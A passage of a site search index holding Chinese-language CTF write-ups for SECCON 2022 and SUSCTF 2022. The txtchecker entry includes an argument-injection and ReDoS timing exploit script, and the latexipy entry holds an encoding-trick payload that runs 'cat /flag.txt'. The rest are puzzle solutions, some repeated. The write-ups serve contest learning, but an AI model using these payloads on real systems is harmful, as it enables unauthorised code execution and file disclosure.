SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}","title":"find flag"},{"location":"writeups/seccon2022/#txtchecker","text":"\u5f88\u5750\u7262\u4f46\u5f88\u6709\u610f\u601d\u7684\u4e00\u9053\u9898\u3002\u9898\u76ee\u4ee3\u7801\u4e3b\u4f53\u5c31\u53ea\u6709\uff1a #!/bin/bash read -p \"Input a file path: \" filepath file $filepath 2 >/dev/null | grep -q \"ASCII text\" 2 >/dev/null exit 0 \u4f1a\u901a\u8fc7 ssh ForceCommand \u5f3a\u5236\u6bcf\u6b21\u8fde\u63a5\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002flag \u5b58\u653e\u5728 /flag.txt \u4e2d\u3002 \u8fd9\u4e2a\u811a\u672c\u53ef\u63a7\u7684\u53ea\u6709 file \u547d\u4ee4\u7684\u53c2\u6570\uff0c\u800c\u4e14\u5176 stdin \u4f1a\u901a\u8fc7\u7ba1\u9053\u4f20\u7ed9\u540e\u9762\u7684 grep\uff0cgrep \u4f7f\u7528\u4e86 -q \u4e5f\u5c31\u662f --quiet\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002\u800c\u4e14\u4e24\u6761\u6307\u4ee4\u7684 stderr \u90fd\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u9ed1\u6d1e\u4e2d\u3002\u5e76\u4e14\u4e0d\u8bba\u7ed3\u679c\u5982\u4f55\u90fd\u4f1a exit 0\u3002\u6240\u4ee5\u5c31\u662f\u4e00\u4e2a\u65e0\u4efb\u4f55\u56de\u663e\u3001\u65e0\u8fd4\u56de\u503c\u7684\u811a\u672c\u3002 \u6240\u4ee5\u601d\u8def\u4e5f\u5c31\u53ea\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u7ed5\u8fc7\uff0c\u7136\u540e getshell\uff0c\u4f46\u662f\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u592a\u53ef\u884c\uff0c\u800c\u4e14\u6240\u6709\u961f\u4f0d\u90fd\u8fde\u63a5\u540c\u4e00\u4e2a\u673a\u5668\uff0c\u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\u6050\u6015\u65e9\u5c31\u88ab\u6253\u70c2\u4e86\u3002\u53e6\u4e00\u4e2a\u601d\u8def\u5c31\u662f\u4fa7\u4fe1\u9053\u3002 \u7ffb\u4e86 file \u7684 man page \uff0c\u5176\u4e2d\u6709\u4e00\u4e2a -m \u53c2\u6570\u53ef\u4ee5\u6307\u5b9a magic \u6587\u4ef6\uff0c\u8fd9\u4e2a magic \u6587\u4ef6\u662f\u7528\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u7684\uff0c\u5b83\u4e5f\u6709 man page \uff0c\u91cc\u9762\u6709\u76f8\u5173\u7684\u683c\u5f0f\u3002\u9664\u6b64\u4e4b\u5916\u4e5f\u641c\u5230\u4e86 file \u6e90\u7801\u4e2d\u7684\u81ea\u5e26 magic file \u4ee5\u53ca\u4e00\u4e2a\u7b2c\u4e09\u65b9 magic file \u7684 repo lindenb/magic \u3002 -m \u53c2\u6570\u53ea\u80fd\u6307\u5b9a magic file \u6587\u4ef6\uff0c\u800c\u6211\u4eec\u60f3\u8981\u7684\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u670d\u52a1\u5668\u4e0a\u7684\u3002\u6240\u4ee5\u8981\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\uff0c\u8bd5\u4e86\u4e00\u4e0b -m /dev/stdin \u662f\u53ef\u4ee5\u7684\uff0c\u6bd4\u5982\u8f93\u5165 /flag -m /dev/stdin \uff0c\u7136\u540e\u5c31\u4f1a\u8981\u6c42\u8f93\u5165 magic file \u5185\u5bb9\uff0c\u7528 Ctrl-D \u7ed3\u675f\u3002\u6309\u7167\u4e0a\u9762\u7684\u4e00\u4e9b\u683c\u5f0f\uff0c\u5c1d\u8bd5\u4f7f\u7528\u6700\u65b9\u4fbf\u7684 regex\uff0c\u672c\u5730\u8c03\u8bd5\uff1a $ echo \"/flag.txt -m /dev/stdin\\n0 regex .* flag\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022 Pseudo-terminal will not be allocated because stdin is not a terminal. ctf@localhost's password: /flag.txt: flag, ASCII text $ echo \"/flag.txt -m /dev/stdin\\n0 regex .* %s\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022 Pseudo-terminal will not be allocated because stdin is not a terminal. ctf@localhost's password: /flag.txt: SECCON{dummy}, ASCII text \u6240\u4ee5\u5176\u5b9e\u5982\u679c\u6709\u56de\u663e\u7684\u8bdd\u5c31\u80fd\u76f4\u63a5\u6cc4\u9732\u51fa flag \u4e86\u3002\u4f46\u662f\u73b0\u5728\u8fd9\u6837\u53ea\u80fd\u901a\u8fc7\u4fa7\u4fe1\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u65f6\u95f4\u957f\u77ed\u6765\u5224\u522b\u3002\u65e2\u7136\u662f\u901a\u8fc7\u6b63\u5219\u5339\u914d\uff0c\u90a3\u4e48\u6211\u4eec\u7406\u8bba\u5c31\u53ef\u4ee5\u901a\u8fc7\u8ba9\u5339\u914d\u548c\u4e0d\u5339\u914d\u65f6\u95f4\u4ea7\u751f\u5dee\u522b\uff0c\u7136\u540e\u9010\u5b57\u7b26 leak \u51fa flag\u3002 \u7136\u540e\u5c31\u641c\u4e86\u641c ReDoS\uff0c\u770b\u4e0d\u592a\u61c2\uff08\u4e4b\u540e\u6709\u65f6\u95f4\u8865\u4e00\u8865\uff09\uff0c\u4f46\u662f\u611f\u89c9\u5728\u8fd9\u91cc\u90fd\u4e0d\u592a\u53ef\u7528\uff0c\u7136\u540e\u56db\u8001\u5e08\u7ed9\u4e86\u4e00\u4e2a (.?){0, 1000} \u8fd9\u4e2a\u6b63\u5219\u662f\u53ef\u4ee5\u5361\u4f4f\u7684\u3002 \u518d\u770b magic \u7684\u683c\u5f0f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6587\u4ef6\u7c7b\u578b\u53ef\u4ee5\u6709\u591a\u6b21\u5339\u914d\uff0c\u5176\u5c42\u7ea7\u901a\u8fc7 > \u6765\u8868\u793a\u3002\u4f8b\u5982\uff1a 0 regex pattern1 >0x18 regex pattern2 type1 >0x18 regex pattern3 type2 >>0x... \u5176\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6811\u72b6\u7684\u7ed3\u6784\uff0c\u524d\u9762\u7684\u4e0d\u6210\u7acb\u7684\u8bdd\uff0c\u4e0b\u4e00\u5c42\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u5339\u914d\u3002\u6240\u4ee5\u53ef\u4ee5\u5728\u7b2c\u4e00\u5c42\u5224\u65ad\u662f\u5426\u5339\u914d flag\uff0c\u5728\u7b2c\u4e8c\u5c42\u901a\u8fc7\u524d\u9762\u7684\u6b63\u5219\u6765\u5361\u4f4f\uff0c\u8fd9\u6837\u5339\u914d\u4e0a\u7684\u8bdd\u65f6\u95f4\u5c31\u4f1a\u62d6\u6162\uff0c\u800c\u6bcf\u5339\u914d\u4e0a\u7684\u5c31\u4f1a\u8f83\u5feb\u4e00\u70b9\u3002\u6240\u4ee5\u8bbe\u8ba1\u7684 magic file payload \u5c31\u662f\uff1a 0 regex SECCON\\\\{%s(.)+\\\\} aaa >0 regex (.?){0, 1000} a \u7136\u540e\u5199\u4e00\u4e2a\u7a0b\u5e8f\u9010\u5b57\u7b26\u5c1d\u8bd5\uff0c\u7136\u540e\u53d6\u65f6\u95f4\u6700\u957f\u7684\u4e00\u4e2a\u586b\u5165 flag \u5e76\u7ee7\u7eed\uff0c\u5c31\u53ef\u4ee5\u4e00\u70b9\u4e00\u70b9 leak \u51fa flag\u3002 exp s = 'echo \"/flag.txt -m /dev/stdin \\n 0 regex SECCON \\\\\\\\\\\\\\\\ { %s (.)+ \\\\\\\\\\\\\\\\ } aaa \\n >0 regex (.?){0,1000} a\" | sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022' import os , time , string import subprocess flag = \"\" for rd in range ( 10 ): res , best = None , None for i in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_$\" : print ( i , end = \" \" ) st = time . time () subprocess . run ( s % ( flag + i ), shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) t = time . time () - st print ( t ) if ( res is None ) or t > best : res = i best = t flag = flag + res print ( f \"SECCON {{ { flag } \" ) \u627e\u961f\u53cb\u8981\u4e86\u4e00\u4e2a\u65e5\u672c\u7684\u5ef6\u8fdf\u5c0f\u7684\u670d\u52a1\u5668\uff0c\u8dd1\u4e86\u4e00\u4e0b\uff0c\u5f97\u5230 flag: SECCON{reDo5L1fe}","title":"txtchecker"},{"location":"writeups/seccon2022/#latexipy","text":"\u9898\u76ee\u4e3b\u4f53\u4ee3\u7801 import sys import ast import re import tempfile from importlib import util def get_fn_name ( source : str ) -> str | None : root = ast . parse ( source ) if type ( root ) is not ast . Module : return None if len ( root . body ) != 1 : return None fn = root . body [ 0 ] if type ( fn ) is not ast . FunctionDef : return None fn . body . clear () if not re . fullmatch ( r \"def \\w+\\((\\w+(, \\w+)*)?\\):\" , ast . unparse ( fn )): # You must define a function without decorators, type annotations, and so on. return None return str ( fn . name ) print ( \"\"\" Latexify as a Service! E.g. def solve(a, b, c): return (-b + math.sqrt(b 2 - 4 a c)) / (2*a) ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb Input your function (the last line must start with __EOF__): \"\"\".strip(), flush=True) source = \"\" while True: line = sys.stdin.readline() if line.startswith(\"__EOF__\"): break source += line name = get_fn_name(source) if name is None: print(\"Invalid source\") exit(1) source += f\"\"\" import latexify __builtins__[\"print\"](latexify.get_latex({name})) \"\"\" with tempfile.NamedTemporaryFile(suffix=\".py\") as file: file.write(source.encode()) file.flush() print() print(\"Result:\") spec = util.spec_from_file_location(\"tmp\", file.name) spec.loader.exec_module(util.module_from_spec(spec)) \u53cd\u6b63\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u51fd\u6570\uff08\u53ea\u80fd\u662f\u5355\u72ec\u4e00\u4e2a\u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u88c5\u9970\u5668\u3001\u7c7b\u578b\u6ce8\u89e3\u7b49\uff09\uff0c\u7136\u540e\u62fc\u63a5\u8d77\u6765\u5f97\u5230\u4e00\u4e2a\u4e34\u65f6\u4ee3\u7801\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u3002\u6548\u679c\u5c31\u662f\u5229\u7528 v0.1.1 \u7248\u672c\u7684 latexify \u6765\u8bb2\u8fd9\u4e2a\u51fd\u6570\u8f6c\u6362\u4e3a LaTeX \u8bed\u6cd5\u7684\u8868\u793a\u3002flag \u5728 /flag.txt\uff0c\u8981\u8bd5\u56fe\u8bfb\u53d6\u5b83\u3002 \u7ffb\u4e86 latexify \u7684\u6e90\u7801\uff0cv0.1.1 \u7684\u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u5c31\u662f core.py \u4e00\u4e2a\u6587\u4ef6\u91cc\u904d\u5386\u4e86\u4e00\u904d ast \u6811\u3002\u6ca1\u6709\u4efb\u4f55 eval \u4e4b\u7c7b\u7684\u3001\u4e5f\u6ca1\u6709\u4efb\u4f55\u8c03\u7528\u90e8\u4ef6\u7684\u5730\u65b9\u3002\u9898\u76ee\u4e5f\u9650\u5236\u7684\u5f88\u6b7b\uff0c\u4e5f\u6ca1\u6709\u8c03\u7528\u7684\u5730\u65b9\u3002\u552f\u4e00\u53ef\u80fd\u5229\u7528\u7684\u662f\u63d0\u4f9b\u4e00\u4e2a print \u51fd\u6570\u8bd5\u56fe\u5728\u6253\u5370\u7ed3\u679c\u7684\u65f6\u5019\u8c03\u7528\uff0c\u4f46\u662f\u5b83\u53c8\u7528\u7684\u662f __builtins__[\"print\"] \u9632\u6b62\u4e86\u8fd9\u4e00\u884c\u4e3a\u3002 \u60f3\u4e86\u5f88\u591a\u3001\u8bd5\u4e86\u5f88\u591a\u3001\u4e5f\u7ffb\u4e86\u6e90\u7801\uff0c\u6ca1\u505a\u51fa\u6765\u3002 \u8d5b\u540e\u770b\u4e86 discord \u4e0a\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5f88\u7b80\u5355\uff0c\u6539\u4e86\u4e00\u4e0b\u5c31\u662f\uff1a # coding: unicode_escape def exp (): return \" \\u0022\\u000a __import__('os').system('cat /flag.txt') \\u000a\\u0022 \" __EOF__ \u8fd9\u4e2a\u539f\u7406\u4e5f\u5f88\u7b80\u5355\u3002\u5c31\u662f\u5728 get_fn_name \u8fdb\u884c\u68c0\u67e5\u7684\u65f6\u5019\u662f\u76f4\u63a5\u5bf9\u8f93\u5165\u8fdb\u884c ast \u89e3\u6790\u7136\u540e\u68c0\u67e5\u8bed\u6cd5\u6811\u7684\uff0c\u8fd9\u65f6\u6ce8\u91ca\u4f1a\u88ab\u5ffd\u7565\uff0creturn \u7684\u5b57\u7b26\u4e32\u662f\u5b8c\u6574\u7684\uff0c\u6240\u4ee5\u4e00\u5207\u68c0\u67e5\u90fd\u53ef\u4ee5\u901a\u8fc7\u3002 \u800c\u5f53\u8fd0\u884c\u7684\u65f6\u5019\u662f\u5c06\u5176\u5199\u5165\u6587\u4ef6\u7136\u540e\u8fd0\u884c\u6587\u4ef6\u7684\u3002\u6211\u4eec\u7684\u8f93\u5165\u5728\u5f00\u5934\uff0c\u7b2c\u4e00\u884c\u7684\u6ce8\u91ca\u5c31\u6307\u5b9a\u4e86\u6587\u4ef6\u7f16\u7801\u4e3a unicode_escape\uff0c\u6240\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u89e3\u7801\u5f97\u5230\u7684\u5c31\u76f8\u5f53\u4e8e\uff1a # coding: unicode_escape def exp () return \"\" __import__ ( 'os' ) . system ( 'cat /flag.txt' ) \"\" import latexify __builtins__ [ \"print\" ]( latexify . get_latex ({ name })) \u6240\u4ee5\u5728\u6267\u884c\u7684\u65f6\u5019\u5c31\u4f1a cat flag \u4e86: SECCON{UTF7_is_hack3r_friend1y_encoding}","title":"latexipy"},{"location":"writeups/susctf2022/","text":"SUSCTF 2022 Writeup \u00b6 Abstract \u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b ra2 \u00b6 \u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard \u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag \u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag flag: SUSCTF{RED_ALERT_WINNER!!!} Tanner \u00b6 Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front) \u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256 \u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1a http://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/ \u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981 \u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a import hashlib import numpy as np def decode ( H , y , m , n , p ): fr = np . zeros (( m , 2 * p )) fs = np . zeros (( m , 2 * p )) sum = np . zeros ( m ) c = np . zeros (( n , p + 2 )) y1 = np . zeros ( n ) for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : fr [ i , count ] = y [ j ] sum [ i ] = sum [ i ] + y [ j ] count = count + 1 for i in range ( m ): for j in range ( 2 * p ): fs [ i , j ] = ( sum [ i ] - fr [ i , j ]) % 2 for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : index = int ( c [ j , p + 1 ]) c [ j , index ] = fs [ i , count ] count = count + 1 c [ j , p + 1 ] += 1 for i in range ( n ): c [ i , p ] = y [ i ] for i in range ( n ): count = 0 for j in range ( p + 1 ): if c [ i , j ] == 1 : count += 1 if count > ( p + 1 ) / 2 : y1 [ i ] = 1 return y1 m = 5 n = 10 p = 2 H = np . zeros (( 5 , 10 )) H = [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 ], [ 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 ], [ 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 ]] ans = 0 for i in range ( 1024 ): bi = f \" { bin ( i )[ 2 :] : >010 } \" lst = list ( map ( int , bi )) res = decode ( H , lst , m , n , p ) if all ( lst == res ): ans += i print ( hashlib . sha256 ( bin ( ans )[ 2 :] . encode ( \"utf-8\" )) . hexdigest ()) # c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1 flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1} AUDIO \u00b6 \u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c \u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389 \u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a ... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. --- SUSCTFMASTEROFAUDIO flag: SUSCTF{MASTEROFAUDIO} misound \u00b6 \u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 e * = _B \u610f\u4e49\u4e0d\u660e \u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3 base64 \u89e3\u7801\uff1a 207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317 \u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c \u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f SUSCTF{ \u548c } \u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408 207 , 5395 359 , 9350 220 , 5727 224 , 5829 352 , 9156 315 , 8190 359 , 9348 317 , 8250 F(x) = 26.011670619246555*x+4.942379114107098 >>> def f ( x ): ... return 26.011670619246555 * x + 4.942379114107098 ... >>> for x , y in zip ([ 207 , 359 , 220 , 224 , 352 , 315 , 359 , 374 , 290 , 310 , 277 , 507 , 391 , 513 , 423 , 392 , 508 , 383 , 440 , 322 , 420 , 427 , 503 , 460 , 295 , 318 , 245 , 302 , 407 , 414 , 410 , 130 , 369 , 317 ], [ 65 , 110 , 69 , 87 , 109 , 117 , 76 , 84 , 105 , 80 , 76 , 121 , 105 , 115 , 95 , 101 , 116 , 105 , 109 , 101 , 115 , 95 , 119 , 105 , 76 , 76 , 98 , 69 , 99 , 111 , 109 , 69 , 95 , 66 ]): ... print ( chr ( round ( f ( x ) / y )), end = \"\" ) ... SUSCTF { tHe_matter_iS_unremArkab1e } flag: SUSCTF{tHe_matter_iS_unremArkab1e}","title":"SUSCTF 2022"},{"location":"writeups/susctf2022/#susctf-2022-writeup","text":"Abstract \u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b","title":"SUSCTF 2022 Writeup"},{"location":"writeups/susctf2022/#ra2","text":"\u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard \u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag \u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag flag: SUSCTF{RED_ALERT_WINNER!!!}","title":"ra2"},{"location":"writeups/susctf2022/#tanner","text":"Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front) \u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256 \u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1a http://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/ \u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981 \u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a import hashlib import numpy as np def decode ( H , y , m , n , p ): fr = np . zeros (( m , 2 * p )) fs = np . zeros (( m , 2 * p )) sum = np . zeros ( m ) c = np . zeros (( n , p + 2 )) y1 = np . zeros ( n ) for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : fr [ i , count ] = y [ j ] sum [ i ] = sum [ i ] + y [ j ] count = count + 1 for i in range ( m ): for j in range ( 2 * p ): fs [ i , j ] = ( sum [ i ] - fr [ i , j ]) % 2 for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : index = int ( c [ j , p + 1 ]) c [ j , index ] = fs [ i , count ] count = count + 1 c [ j , p + 1 ] += 1 for i in range ( n ): c [ i , p ] = y [ i ] for i in range ( n ): count = 0 for j in range ( p + 1 ): if c [ i , j ] == 1 : count += 1 if count > ( p + 1 ) / 2 : y1 [ i ] = 1 return y1 m = 5 n = 10 p = 2 H = np . zeros (( 5 , 10 )) H = [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 ], [ 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 ], [ 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 ]] ans = 0 for i in range ( 1024 ): bi = f \" { bin ( i )[ 2 :] : >010 } \" lst = list ( map ( int , bi )) res = decode ( H , lst , m , n , p ) if all ( lst == res ): ans += i print ( hashlib . sha256 ( bin ( ans )[ 2 :] . encode ( \"utf-8\" )) . hexdigest ()) # c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1 flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}","title":"Tanner"},{"location":"writeups/susctf2022/#audio","text":"\u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c \u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389 \u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a ... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. --- SUSCTFMASTEROFAUDIO flag: SUSCTF{MASTEROFAUDIO}","title":"AUDIO"},{"location":"writeups/susctf2022/#misound","text":"\u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 e * = _B \u610f\u4e49\u4e0d\u660e \u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3 base64 \u89e3\u7801\uff1a 207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 